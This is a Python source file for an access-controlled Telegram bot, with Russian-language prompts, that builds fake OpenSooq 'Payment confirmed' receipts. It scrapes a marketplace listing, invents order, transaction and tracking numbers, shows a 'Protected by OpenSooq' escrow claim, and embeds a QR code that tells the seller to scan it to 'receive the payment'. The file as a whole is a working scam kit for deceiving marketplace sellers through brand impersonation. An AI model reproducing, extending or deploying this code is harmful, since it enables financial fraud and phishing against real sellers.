import os
import asyncio
import io
import re
import random
import string
import unicodedata
from urllib.parse import quote
from datetime import datetime, timezone, timedelta

import requests
import qrcode
import arabic_reshaper
from bs4 import BeautifulSoup
from PIL import Image, ImageDraw, ImageFont, ImageOps

from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ConversationHandler, ContextTypes

TOKEN = os.environ.get("TOKEN")
ADMIN_ID = 1110325917
WAITING_PRICE, WAITING_NAME = range(2)
GREEN = "#22C55E"
LIGHT_GREEN = "#064E3B"
NAVY = "#F8FAFC"
GRAY = "#94A3B8"
BORDER = "#334155"
BG_COLOR = "#0A0E17"
CARD_BG = "#111827"
QR_EYE_COLOR = "#0DEF05"
QR_DOT_COLOR = "#000000"

TRANSLATIONS = {
    "EN": {"payment_confirmed": "Payment confirmed", "payment_secure": "Your payment has been secured.", "order": "Order #", "processing": "Processing", "transaction_id": "Transaction ID", "tracking_number": "Tracking Number", "delivery_status": "Delivery Status", "in_progress": "In progress", "waiting_seller": "Waiting for the seller\nto receive the funds", "seller_confirmed": "Seller confirmed", "preparing": "Preparing shipment", "courier": "Courier pickup", "protected": "Protected by OpenSooq", "protected_text": "Your payment is secure and protected until you receive your order.", "help": "(i) Need help? Visit our Help Center or contact support.", "qr_text": "Send this QR code\nto the seller so they can\nreceive the payment.", "no_photo": "NO PHOTO", "price_not_avail": "Price not available", "payment_time": "Payment Time:"},
    "AR": {"payment_confirmed": "تم الدفع بنجاح", "payment_secure": "مبلغك محفوظ بأمان.", "order": "طلب رقم #", "processing": "جاري المعالجة", "transaction_id": "رقم العملية", "tracking_number": "رقم التتبع", "delivery_status": "حالة التوصيل", "in_progress": "جاري التنفيذ", "waiting_seller": "بانتظار البائع\nلاستلام المبلغ", "seller_confirmed": "تم تأكيد البائع", "preparing": "جاري التجهيز", "courier": "استلام المندوب", "protected": "محمي بواسطة OpenSooq", "protected_text": "مبلغك آمن ومحمي لحين استلام طلبك.", "help": "(i) تحتاج مساعدة؟ زر مركز المساعدة أو تواصل معنا.", "qr_text": "أرسل رمز الـ QR\nللبائع عشان يقدر\nيستلم المبلغ.", "no_photo": "لا توجد صورة", "price_not_avail": "السعر غير متوفر", "payment_time": "وقت الدفع:"}
}

def generate_password(length=8):
    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length))

def save_user_password(uid, pwd):
    data = {}
    if os.path.exists("passwords.txt"):
        with open("passwords.txt", "r") as f:
            for line in f:
                if ":" in line:
                    k, v = line.strip().split(":", 1)
                    data[k] = v
    data[str(uid)] = pwd
    with open("passwords.txt", "w") as f:
        for k, v in data.items(): f.write(f"{k}:{v}\n")

def check_user_password(uid, pwd):
    if not os.path.exists("passwords.txt"): return False
    with open("passwords.txt", "r") as f:
        for line in f:
            if ":" in line:
                k, v = line.strip().split(":", 1)
                if k == str(uid) and v == pwd: return True
    return False

def get_blocked_list():
    try:
        with open("blocked.txt", "r") as f: return [int(l.strip()) for l in f if l.strip()]
    except FileNotFoundError: return []

def block_user(uid):
    if uid not in get_blocked_list():
        with open("blocked.txt", "a") as f: f.write(f"{uid}\n")

def unblock_user(uid):
    if os.path.exists("blocked.txt"):
        lines = open("blocked.txt").readlines()
        with open("blocked.txt", "w") as f:
            for l in lines:
                if l.strip() != str(uid): f.write(l)

async def delete_messages(ctx, chat_id, ids):
    for i in ids:
        try:
            await ctx.bot.delete_message(chat_id=chat_id, message_id=i)
            await asyncio.sleep(0.1)
        except: pass

def font(size, bold=False):
    path = "/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf" if bold else "/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf"
    try: return ImageFont.truetype(path, size)
    except: return ImageFont.load_default(size=size)

def prepare_text(val):
    val = "".join(c for c in str(val) if not unicodedata.category(c).startswith('So'))
    if any("\u0600" <= c <= "\u06FF" for c in val): return arabic_reshaper.reshape(val)
    return val.strip()

def fit_text(draw, val, max_w, size=28):
    val = prepare_text(val)
    f = font(size, True)
    while val and draw.textbbox((0, 0), val, font=f)[2] > max_w: val = val[:-2] + "…"
    return val, f

def generate_new_qr(data, size=230):
    qr = qrcode.QRCode(error_correction=qrcode.constants.ERROR_CORRECT_H, box_size=10, border=0)
    qr.add_data(data); qr.make(fit=True)
    matrix = qr.get_matrix(); n = len(matrix)
    box = size // n; actual = box * n
    img = Image.new("RGBA", (actual, actual), (255, 255, 255, 255))
    draw = ImageDraw.Draw(img)
    for r in range(n):
        for c in range(n):
            if matrix[r][c]:
                if (r < 7 and c < 7) or (r < 7 and c >= n - 7) or (r >= n - 7 and c < 7): continue
                draw.ellipse([c*box, r*box, c*box+box, r*box+box], fill=QR_DOT_COLOR)
    def eye(x, y):
        es = box * 7
        draw.rounded_rectangle([x, y, x+es, y+es], radius=box*2, fill=QR_EYE_COLOR)
        draw.rounded_rectangle([x+box, y+box, x+es-box, y+es-box], radius=box, fill=(255,255,255,255))
        draw.rounded_rectangle([x+box*2, y+box*2, x+es-box*2, y+es-box*2], radius=box//2, fill=QR_EYE_COLOR)
    eye(0, 0); eye(actual - box*7, 0); eye(0, actual - box*7)
    return img

def make_card(data, lang="EN"):
    t = TRANSLATIONS[lang]
    W, H = 1000, 1480 
    img = Image.new("RGB", (W, H), BG_COLOR)
    draw = ImageDraw.Draw(img)
    def check(x, y, s, c):
        draw.ellipse((x, y, x+s, y+s), fill=c)
        cx, cy = x+s//2, y+s//2
        draw.line((cx-15, cy, cx-5, cy+10), fill="white", width=6)
        draw.line((cx-5, cy+10, cx+15, cy-10), fill="white", width=6)
    draw.rounded_rectangle((40, 40, W-40, 160), radius=20, fill=LIGHT_GREEN)
    check(70, 65, 70, GREEN)
    draw.text((160, 70), prepare_text(t["payment_confirmed"]), font=font(36, True), fill=NAVY)
    draw.text((160, 115), prepare_text(t["payment_secure"]), font=font(24), fill=GRAY)
    draw.text((W-80, 90), ">", font=font(40, True), fill=GRAY)
    draw.rounded_rectangle((40, 190, W-40, 850), radius=20, fill=CARD_BG, outline=BORDER, width=2)
    draw.text((70, 220), prepare_text(t["order"]), font=font(24), fill=GRAY)
    draw.text((70, 250), data["order_id"], font=font(55, True), fill=NAVY)
    draw.rounded_rectangle((70, 320, 240, 365), radius=15, fill="#064E3B")
    pt, pf = fit_text(draw, t["processing"], 150, 24)
    draw.text((85, 335), pt, font=pf, fill=GREEN)
    if data["image"]:
        p_img = ImageOps.fit(data["image"], (220, 220), Image.Resampling.LANCZOS)
        mask = Image.new("L", p_img.size, 0)
        ImageDraw.Draw(mask).rounded_rectangle((0, 0, 220, 220), radius=15, fill=255)
        img.paste(p_img, (70, 400), mask)
    else:
        draw.rounded_rectangle((70, 400, 290, 620), radius=15, fill="#0F172A")
        draw.text((130, 500), t["no_photo"], font=font(20, True), fill=GRAY)
    title, tf = fit_text(draw, data["title"], 310, 26)
    draw.text((320, 410), title, font=tf, fill=NAVY)
    curr = data['currency'] if data['currency'] else ""
    price = f"{data['price']} {curr}" if data["price"] else t["price_not_avail"]
    draw.text((320, 480), price, font=font(45, True), fill=NAVY)
    draw.rounded_rectangle((630, 210, 930, 680), radius=20, fill="#FFFFFF", outline=BORDER, width=2)
    draw.text((660, 230), prepare_text(t["payment_time"]), font=font(18), fill="#64748B")
    draw.text((660, 255), data.get("local_time", ""), font=font(24, True), fill="#000000")
    qr = generate_new_qr(data["url_with_time"], size=200) 
    img.paste(qr, (680, 300), qr) 
    draw.multiline_text((780, 520), prepare_text(t["qr_text"]), font=font(16), fill="#64748B", align="center", anchor="ma", spacing=4)
    draw.line((70, 650, W-70, 650), fill=BORDER, width=2)
    draw.rounded_rectangle((70, 690, 120, 725), radius=5, outline=GRAY, width=4)
    draw.line((70, 700, 120, 700), fill=GRAY, width=4)
    draw.text((140, 680), prepare_text(t["transaction_id"]), font=font(22), fill=GRAY)
    draw.text((140, 710), data["trans_id"], font=font(32, True), fill=NAVY)
    tx, ty = 530, 690
    draw.rectangle((tx, ty+10, tx+40, ty+40), outline=GRAY, width=4)
    draw.polygon([(tx+40, ty+15), (tx+60, ty+25), (tx+60, ty+40), (tx+40, ty+40)], outline=GRAY, width=4)
    draw.ellipse((tx+5, ty+35, tx+15, ty+45), fill=GRAY)
    draw.ellipse((tx+45, ty+35, tx+55, ty+45), fill=GRAY)
    draw.text((610, 680), prepare_text(t["tracking_number"]), font=font(22), fill=GRAY)
    draw.text((610, 710), data["track_id"], font=font(32, True), fill=NAVY)
    draw.rounded_rectangle((40, 880, W-40, 1130), radius=20, fill=CARD_BG, outline=BORDER, width=2)
    tx, ty = 70, 910
    draw.rectangle((tx, ty+10, tx+40, ty+40), outline=NAVY, width=4)
    draw.polygon([(tx+40, ty+15), (tx+60, ty+25), (tx+60, ty+40), (tx+40, ty+40)], outline=NAVY, width=4)
    draw.ellipse((tx+5, ty+35, tx+15, ty+45), fill=NAVY)
    draw.ellipse((tx+45, ty+35, tx+55, ty+45), fill=NAVY)
    draw.text((150, 910), prepare_text(t["delivery_status"]), font=font(34, True), fill=NAVY)
    draw.rounded_rectangle((750, 905, 930, 950), radius=15, fill="#064E3B")
    draw.text((780, 915), prepare_text(t["in_progress"]), font=font(22, True), fill=GREEN)
    ly = 1010; pts = [100, 330, 560, 790]
    draw.line((pts[0], ly, pts[-1], ly), fill=BORDER, width=4)
    draw.line((pts[0], ly, pts[1], ly), fill=GREEN, width=4)
    lbls = [t["waiting_seller"], t["seller_confirmed"], t["preparing"], t["courier"]]
    for i, p in enumerate(pts):
        if i == 0:
            draw.ellipse((p-20, ly-20, p+20, ly+20), fill=GREEN)
            draw.line((p-8, ly, p-2, ly+8), fill="white", width=4)
            draw.line((p-2, ly+8, p+10, ly-8), fill="white", width=4)
            draw.text((p-60, ly+35), prepare_text(lbls[i]), font=font(18), fill=NAVY)
        else:
            draw.ellipse((p-20, ly-20, p+20, ly+20), fill=CARD_BG, outline=BORDER, width=3)
            draw.text((p-80, ly+35), prepare_text(lbls[i]), font=font(18), fill=GRAY)
    draw.rounded_rectangle((40, 1160, W-40, 1280), radius=20, fill=CARD_BG, outline=BORDER, width=2)
    check(70, 1185, 60, GREEN)
    draw.text((150, 1185), prepare_text(t["protected"]), font=font(30, True), fill=NAVY)
    draw.text((150, 1225), prepare_text(t["protected_text"]), font=font(20), fill=GRAY)
    draw.text((W-80, 1200), ">", font=font(40, True), fill=GRAY)
    draw.rounded_rectangle((40, 1310, W-40, 1390), radius=15, fill="#111827")
    draw.text((70, 1335), prepare_text(t["help"]), font=font(22), fill=GRAY)
    out = io.BytesIO()
    img.save(out, format="PNG"); out.seek(0); out.name = "card.png"
    return out

def get_time_for_currency(curr):
    now = datetime.now(timezone.utc)
    if not curr: return now.strftime("%Y-%m-%d %H:%M UTC"), "UTC"
    c = curr.upper()
    if c in ["KWD", "BHD", "OMR"]: return now.astimezone(timezone(timedelta(hours=3))).strftime("%Y-%m-%d %H:%M (Kuwait)"), "KWT"
    elif c in ["AED", "SAR"]: return now.astimezone(timezone(timedelta(hours=4))).strftime("%Y-%m-%d %H:%M (UAE)"), "UAE"
    return now.strftime("%Y-%m-%d %H:%M (UTC)"), "UTC"

def get_meta(soup, name):
    tag = soup.find("meta", property=name) or soup.find("meta", attrs={"name": name})
    return tag.get("content", "").strip() if tag else ""

def get_listing(txt):
    m = re.search(r'(https?://\S+)', txt)
    if not m: raise ValueError("Ссылка не найдена")
    link = m.group(1)
    s = requests.Session(); s.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0"})
    r = s.get(link, timeout=20, allow_redirects=True); r.raise_for_status()
    soup = BeautifulSoup(r.text, "html.parser")
    title = get_meta(soup, "og:title") or "OpenSooq Delivery"
    price = curr = None
    match = re.search(r"(\d+[\.,]?\d*)\s*(KWD|BHD|OMR|JOD|EGP|USD|SAR|AED|QR|RUB|EUR)", txt, re.I)
    if match: price, curr = match.group(1), match.group(2).upper()
    img_url = get_meta(soup, "og:image") or get_meta(soup, "twitter:image")
    match_id = re.search(r"(\d{8,12})", r.url)
    lid = match_id.group(1) if match_id else "—"
    oid = f"OS-{random.randint(100000, 999999)}"; tid = f"OSQ-{random.randint(10000000, 99999999)}"; trid = f"OS-DEL-{random.randint(1000000, 9999999)}"
    ltime, _ = get_time_for_currency(curr)
    url_t = f"{r.url}?t={quote(ltime)}"
    p_img = None
    if img_url:
        try:
            ir = s.get(img_url, timeout=15)
            if ir.status_code == 200 and len(ir.content) > 1000: p_img = Image.open(io.BytesIO(ir.content)).convert("RGB")
        except: pass
    return {"title": title, "price": price, "currency": curr, "listing_id": lid, "image": p_img, "url": r.url, "url_with_time": url_t, "local_time": ltime, "track_id": trid, "order_id": oid, "trans_id": tid}

async def start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id in get_blocked_list(): return await update.message.reply_text("⛔ Вы заблокированы.")
    if ctx.user_data.get("authorized"): await update.message.reply_text("Ты авторизован! Отправляй ссылку.")
    else: await update.message.reply_text("Привет! Введи пароль:")

async def handle_link(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id in get_blocked_list(): return await update.message.reply_text("⛔ Вы заблокированы.")
    txt = update.message.text.strip()
    if not ctx.user_data.get("authorized"):
        if check_user_password(update.effective_user.id, txt):
            ctx.user_data["authorized"] = True
            try: await ctx.bot.send_message(chat_id=ADMIN_ID, text=f"🚨 Новый юзер: {update.effective_user.id}", parse_mode="Markdown")
            except: pass
            await update.message.reply_text("✅ Пароль верный! Отправь ссылку.")
        else: await update.message.reply_text("❌ Неверный пароль.")
        return ConversationHandler.END
    ctx.user_data["msg_ids"] = [update.message.message_id]
    msg = await update.message.reply_text("Ищу данные...")
    ctx.user_data["msg_ids"].append(msg.message_id)
    try:
        data = await asyncio.to_thread(get_listing, txt)
        ctx.user_data["card_data"] = data
        msg = await update.message.reply_text("Введи цену (например, 55 KWD) или /skip")
        ctx.user_data["msg_ids"].append(msg.message_id)
        return WAITING_PRICE
    except Exception as e: await update.message.reply_text(f"ОШИБКА:\n{e}"); return ConversationHandler.END

async def get_price(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    ctx.user_data["msg_ids"].append(update.message.message_id)
    txt = update.message.text.strip()
    if txt != "/skip":
        m = re.search(r"(\d+[\.,]?\d*)\s*(KWD|BHD|OMR|JOD|EGP|USD|SAR|AED|QR|RUB|EUR)", txt, re.I)
        if m: ctx.user_data["card_data"]["price"], ctx.user_data["card_data"]["currency"] = m.group(1), m.group(2).upper()
        else: ctx.user_data["card_data"]["price"], ctx.user_data["card_data"]["currency"] = txt, ""
    msg = await update.message.reply_text("Введи название товара или /skip")
    ctx.user_data["msg_ids"].append(msg.message_id)
    return WAITING_NAME

async def get_name(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    ctx.user_data["msg_ids"].append(update.message.message_id)
    if update.message.text.strip() != "/skip": ctx.user_data["card_data"]["title"] = update.message.text.strip()
    data = ctx.user_data["card_data"]; ctx.user_data["last_card_data"] = data
    if data["image"]:
        msg = await update.message.reply_text("Собираю карточку...")
        ctx.user_data["msg_ids"].append(msg.message_id)
        card = await asyncio.to_thread(make_card, data, "EN")
        await update.message.reply_photo(photo=card, caption="Готово! /create arabic для арабской версии", read_timeout=60, write_timeout=60, connect_timeout=60)
        await asyncio.sleep(5); await delete_messages(ctx, update.effective_chat.id, ctx.user_data.get("msg_ids", [])); ctx.user_data["msg_ids"] = []
        return ConversationHandler.END
    else:
        msg = await update.message.reply_text("⚠️ Фото нет. Отправь картинку.")
        ctx.user_data["msg_ids"].append(msg.message_id); return ConversationHandler.END

async def handle_photo(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id in get_blocked_list() or not ctx.user_data.get("authorized"): return
    ctx.user_data["msg_ids"].append(update.message.message_id)
    data = ctx.user_data.get("card_data")
    if not data: return
    msg = await update.message.reply_text("Собираю карточку...")
    ctx.user_data["msg_ids"].append(msg.message_id)
    try:
        photo = await update.message.photo[-1].get_file()
        data["image"] = Image.open(io.BytesIO(await photo.download_as_bytearray())).convert("RGB")
        ctx.user_data["last_card_data"] = data
        card = await asyncio.to_thread(make_card, data, "EN")
        await update.message.reply_photo(photo=card, caption="Готово! /create arabic для арабской версии", read_timeout=60, write_timeout=60, connect_timeout=60)
        await asyncio.sleep(5); await delete_messages(ctx, update.effective_chat.id, ctx.user_data.get("msg_ids", []))
        ctx.user_data["msg_ids"] = []; ctx.user_data["card_data"] = None
    except Exception as e: await update.message.reply_text(f"ОШИБКА:\n{e}")

async def create_command(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id in get_blocked_list(): return
    data = ctx.user_data.get("last_card_data")
    if not data: return await update.message.reply_text("Нет данных. Сначала отправь ссылку.")
    lang = "AR" if ctx.args and ctx.args[0].lower() in ["arabic", "ar", "kuwait"] else "EN"
    msg = await update.message.reply_text("Собираю...")
    try:
        card = await asyncio.to_thread(make_card, data, lang)
        await update.message.reply_photo(photo=card, caption="Готово!", read_timeout=60, write_timeout=60, connect_timeout=60)
        await asyncio.sleep(3); await ctx.bot.delete_message(chat_id=update.effective_chat.id, message_id=msg.message_id)
    except Exception as e: await update.message.reply_text(f"❌ ОШИБКА:\n\n{e}")

async def createpass_command(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID: return
    try:
        tid = ctx.args[0]; pwd = generate_password(); save_user_password(tid, pwd)
        await update.message.reply_text(f"✅ Пароль для `{tid}`: `{pwd}`", parse_mode="Markdown")
    except: await update.message.reply_text("⚠️ /createpass 123456789", parse_mode="Markdown")

async def admin_command(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID: return
    await update.message.reply_text("👑 *АДМИНКА*\n\n🔑 `/createpass [ID]`\n🚫 `/block [ID]`\n✅ `/unblock [ID]`", parse_mode="Markdown")

async def block_command(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID: return
    try: block_user(int(ctx.args[0])); await update.message.reply_text("✅ Заблокирован!")
    except: await update.message.reply_text("⚠️ /block 123456789", parse_mode="Markdown")

async def unblock_command(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID: return
    try: unblock_user(int(ctx.args[0])); await update.message.reply_text("✅ Разблокирован!")
    except: await update.message.reply_text("⚠️ /unblock 123456789", parse_mode="Markdown")

async def run_bot():
    app = Application.builder().token(TOKEN).build()
    conv = ConversationHandler(
        entry_points=[MessageHandler(filters.TEXT & ~filters.COMMAND, handle_link)],
        states={WAITING_PRICE: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_price)], WAITING_NAME: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_name)]},
        fallbacks=[CommandHandler("start", start)]
    )
    app.add_handler(CommandHandler("createpass", createpass_command))
    app.add_handler(CommandHandler("admin", admin_command))
    app.add_handler(CommandHandler("block", block_command))
    app.add_handler(CommandHandler("unblock", unblock_command))
    app.add_handler(CommandHandler("create", create_command))
    app.add_handler(CommandHandler("start", start))
    app.add_handler(conv)
    app.add_handler(MessageHandler(filters.PHOTO, handle_photo))
    await app.initialize(); await app.start(); await app.updater.start_polling()
    print("✅ БОТ ЗАПУЩЕН (черная тема с QR-временем)")

if __name__ == "__main__":
    asyncio.run(run_bot())